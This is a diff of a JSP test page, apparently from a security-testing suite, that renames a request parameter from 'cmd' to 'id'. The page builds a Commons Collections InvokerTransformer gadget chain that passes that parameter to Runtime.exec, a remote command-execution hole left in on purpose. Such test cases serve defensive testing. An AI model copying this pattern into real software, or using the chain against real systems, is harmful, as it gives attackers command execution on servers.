@@ -22,9 +22,9 @@
 <body>
     <h1>009 - 使用 InvokerTransformer 反序列化并执行命令</h1>
 <%
-        String linux_querystring = "?cmd=whoami";
-        String windows_querystring = "?cmd=calc.exe";
-    if (request.getParameter("cmd") != null) {
+        String linux_querystring = "?id=whoami";
+        String windows_querystring = "?id=calc";
+    if (request.getParameter("id") != null) {
 	    try {
             Transformer[] transformers = new Transformer[]{
                     new ConstantTransformer(Runtime.class),
@@ -32,7 +32,7 @@
                             new Object[]{"getRuntime", new Class[0]}),
                     new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class},
                             new Object[]{null, new Object[0]}),
-                    new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{request.getParameter("cmd")})
+                    new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{request.getParameter("id")})
             };
 
             Transformer transformerChain = new ChainedTransformer(transformers);
